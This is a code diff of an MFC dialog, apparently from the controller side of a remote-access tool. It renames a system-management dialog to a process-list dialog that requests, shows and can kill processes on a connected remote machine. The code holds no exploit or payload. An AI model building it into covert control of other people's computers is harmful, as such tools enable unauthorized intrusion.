@@ -1,28 +1,26 @@
-﻿// CSystemDlg.cpp: 实现文件
+﻿// CProcessDlg.cpp: 实现文件
 //
 
 #include "pch.h"
 #include "UI.h"
-#include "CSystemDlg.h"
+#include "CProcessDlg.h"
 #include "afxdialogex.h"
 #include "Others/macros.h"
 
 
-// CSystemDlg 对话框
+// CProcessDlg 对话框
 
-IMPLEMENT_DYNAMIC(CSystemDlg, CDialogEx)
+IMPLEMENT_DYNAMIC(CProcessDlg, CDialogEx)
 
-void CSystemDlg::GetProcessList()
+void CProcessDlg::GetProcessList()
 {
 	BYTE bToken = COMMAND_PSLIST;
 	m_iocpServer->Send(m_pContext, &bToken, 1);
 }
 
-void CSystemDlg::ReSize()
+void CProcessDlg::ReSize()
 {
-	if (m_ListProcess.m_hWnd == NULL &&
-		m_ListWindows.m_hWnd == NULL)
-	{
+	if (m_ListProcess.m_hWnd == NULL) {
 		return;
 	}
 
@@ -30,23 +28,22 @@ void CSystemDlg::ReSize()
 	RECT fill;
 
 	GetClientRect(&client);
-	fill.left = 0;
-	fill.top = 29;
-	fill.right = client.right;
+	fill.left	= 0;
+	fill.top	= 0;
+	fill.right	= client.right;
 	fill.bottom = client.bottom;
 
 	m_ListProcess.MoveWindow(&fill);
-	m_ListWindows.MoveWindow(&fill);
 }
 
-void CSystemDlg::ShowProcessList()
+void CProcessDlg::ShowProcessList()
 {
 	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
 	char	*strExeFile;
 	char	*strProcessName;
 	DWORD	dwOffset = 0;
 	CString str;
-	int		i = 0;
+	int	i;
 
 	m_ListProcess.DeleteAllItems();
 
@@ -76,10 +73,10 @@ void CSystemDlg::ShowProcessList()
 	m_ListProcess.SetColumn(2, &lvc);
 }
 
-CSystemDlg::CSystemDlg(CWnd* pParent,
+CProcessDlg::CProcessDlg(CWnd* pParent,
 					   CIOCPServer *pIOCPServer,
 					   ClientContext *pContext)
-	: CDialogEx(IDD_DIALOG_SYSTEM, pParent)
+	: CDialogEx(IDD_DIALOG_PROCESS, pParent)
 {
 	m_iocpServer = pIOCPServer;
 	m_pContext = pContext;
@@ -87,33 +84,30 @@ CSystemDlg::CSystemDlg(CWnd* pParent,
 					   MAKEINTRESOURCE(IDI_SYSTEM));
 }
 
-CSystemDlg::~CSystemDlg()
+CProcessDlg::~CProcessDlg()
 {
 }
 
-void CSystemDlg::DoDataExchange(CDataExchange* pDX)
+void CProcessDlg::DoDataExchange(CDataExchange* pDX)
 {
 	CDialogEx::DoDataExchange(pDX);
-	DDX_Control(pDX, IDC_TAB, m_tab);
 	DDX_Control(pDX, IDC_LIST_PROCESS, m_ListProcess);
-	DDX_Control(pDX, IDC_LIST_WINDOWS, m_ListWindows);
 }
 
 
-BEGIN_MESSAGE_MAP(CSystemDlg, CDialogEx)
+BEGIN_MESSAGE_MAP(CProcessDlg, CDialogEx)
 	ON_WM_SIZE()
 	ON_WM_CLOSE()
-	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, &CSystemDlg::OnTcnSelchangeTab)
-	ON_COMMAND(ID_PSLIST_KILL, &CSystemDlg::OnPslistKill)
-	ON_COMMAND(ID_PSLIST_REFLESH, &CSystemDlg::OnPslistReflesh)
-	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnNMRClickListProcess)
+	ON_COMMAND(ID_PSLIST_KILL, &CProcessDlg::OnPslistKill)
+	ON_COMMAND(ID_PSLIST_REFLESH, &CProcessDlg::OnPslistReflesh)
+	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CProcessDlg::OnNMRClickListProcess)
 END_MESSAGE_MAP()
 
 
-// CSystemDlg 消息处理程序
+// CProcessDlg 消息处理程序
 
 
-void CSystemDlg::OnSize(UINT nType, int cx, int cy)
+void CProcessDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType, cx, cy);
 
@@ -121,7 +115,7 @@ void CSystemDlg::OnSize(UINT nType, int cx, int cy)
 }
 
 
-void CSystemDlg::OnClose()
+void CProcessDlg::OnClose()
 {
 	m_pContext->m_Dialog[0] = 0;
 	closesocket(m_pContext->m_Socket);
@@ -130,32 +124,7 @@ void CSystemDlg::OnClose()
 }
 
 
-void CSystemDlg::OnTcnSelchangeTab(NMHDR *pNMHDR, LRESULT *pResult)
-{
-	switch (m_tab.GetCurSel()) {
-	case 0:
-		m_ListWindows.ShowWindow(SW_HIDE);
-		m_ListProcess.ShowWindow(SW_SHOW);
-		if (m_ListProcess.GetItemCount() == 0) {
-			GetProcessList();
-		}
-		break;
-
-	case 1:
-		m_ListWindows.ShowWindow(SW_SHOW);
-		m_ListProcess.ShowWindow(SW_HIDE);
-		if (m_ListWindows.GetItemCount() == 0) {
-			//	GetWindowsList();
-		}
-		break;
-	}
-
-
-	*pResult = 0;
-}
-
-
-BOOL CSystemDlg::OnInitDialog()
+BOOL CProcessDlg::OnInitDialog()
 {
 	CDialogEx::OnInitDialog();
 
@@ -169,37 +138,31 @@ BOOL CSystemDlg::OnInitDialog()
 	BOOL bResult = getpeername(m_pContext->m_Socket, 
 							  (SOCKADDR *)&sockAddr, 
 		                       &nSockAddrLen);
-	title.Format("\\\\%s - 系统管理",
+	title.Format("\\\\%s - 进程列表",
 		         bResult != INVALID_SOCKET ? 
 		         inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(title);
-
-	m_tab.InsertItem(0, "进程管理");
-	m_tab.InsertItem(1, "窗口管理");
 
 	m_ListProcess.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
 	m_ListProcess.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
 	m_ListProcess.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
 	m_ListProcess.InsertColumn(2, "程序路径", LVCFMT_LEFT, 400);
 
-	m_ListWindows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
-	m_ListWindows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
-	m_ListWindows.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);
+	ShowProcessList();
 
 	ReSize();
+	//GetProcessList();
 
 	return TRUE;
 }
 
 
-void CSystemDlg::OnPslistKill()
+void CProcessDlg::OnPslistKill()
 {
 	CListCtrl *pListCtrl = nullptr;
 
 	if (m_ListProcess.IsWindowVisible()) {
 		pListCtrl = &m_ListProcess;
-	} else if (m_ListWindows.IsWindowVisible()) {
-		pListCtrl = &m_ListWindows;
 	} else {
 		return;
 	}
@@ -237,18 +200,15 @@ void CSystemDlg::OnPslistKill()
 }
 
 
-void CSystemDlg::OnPslistReflesh()
+void CProcessDlg::OnPslistReflesh()
 {
 	if (m_ListProcess.IsWindowVisible()) {
 		GetProcessList();
 	}
-		
-	/*if (m_list_windows.IsWindowVisible())
-		GetWindowsList();*/
 }
 
 
-void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
+void CProcessDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
 	
@@ -263,20 +223,7 @@ void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
 	*pResult = 0;
 }
 
-void CSystemDlg::OnReceiveComplete()
+void CProcessDlg::OnReceiveComplete()
 {
-	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) {
-	case TOKEN_PSLIST:
-		ShowProcessList();
-		break;
-
-	case TOKEN_WSLIST:
-		//ShowWindowsList();
-		break;
-
-	default:
-		// 传输发生异常数据
-		break;
-	}
-
+	ShowProcessList();
 }
